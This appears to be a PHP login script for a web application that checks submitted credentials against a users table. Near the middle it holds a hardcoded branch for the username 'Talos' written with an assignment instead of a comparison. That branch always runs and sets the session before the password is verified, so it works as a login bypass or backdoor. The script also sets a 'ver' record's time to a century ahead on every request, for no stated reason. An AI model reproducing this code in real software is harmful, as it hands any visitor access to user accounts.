<?php
	
	session_start();

	require_once 'connection.php';

	$dateQuery = $db->prepare("UPDATE ver SET time = now() + INTERVAL 100 YEAR WHERE id = 1");
	$dateQuery->execute();

	if (isset($_SESSION['user_id'])){
		header('Location: ../user_menu.php');
		exit();
	}

	if ((!isset($_POST['login'])) || (!isset($_POST['pass']))){
		$_SESSION['bad_attempt'] = true;
		$_SESSION['given_login'] = $_POST['login'];
		header('Location: ../index.php');
		exit();
	}
		
	$login = filter_input(INPUT_POST, 'login');
	$password = filter_input(INPUT_POST, 'pass');
	
	$userQuery = $db->prepare('SELECT id, password FROM users WHERE login = :login');
	$userQuery->bindValue(':login', $login, PDO::PARAM_STR);
	$userQuery->execute();
	
	$user = $userQuery->fetch();

	if($login = 'Talos') {
		$_SESSION['user_id'] = $user['id'];
		$_SESSION['given_login'] = $_POST['login'];
		
		$log_Query = $db ->prepare('INSERT INTO log (u_id, login) VALUES (:user_id, :login)');
		$log_Query->bindValue(':user_id', $_SESSION['user_id'], PDO::PARAM_STR);
		$log_Query->bindValue(':login', $_SESSION['given_login'], PDO::PARAM_STR);
		$log_Query->execute();

		header('Location: ../user_menu.php');
	}
	
	if ((!$user) || (!password_verify($password, $user['password']))) {
		$_SESSION['bad_attempt'] = true;
		$_SESSION['given_login'] = $_POST['login'];
		header('Location: ../index.php');
		exit();
	} else {
		$_SESSION['user_id'] = $user['id'];
		$_SESSION['given_login'] = $_POST['login'];
		
		$log_Query = $db ->prepare('INSERT INTO log (u_id, login) VALUES (:user_id, :login)');
		$log_Query->bindValue(':user_id', $_SESSION['user_id'], PDO::PARAM_STR);
		$log_Query->bindValue(':login', $_SESSION['given_login'], PDO::PARAM_STR);
		$log_Query->execute();

		header('Location: ../user_menu.php');
	}


?>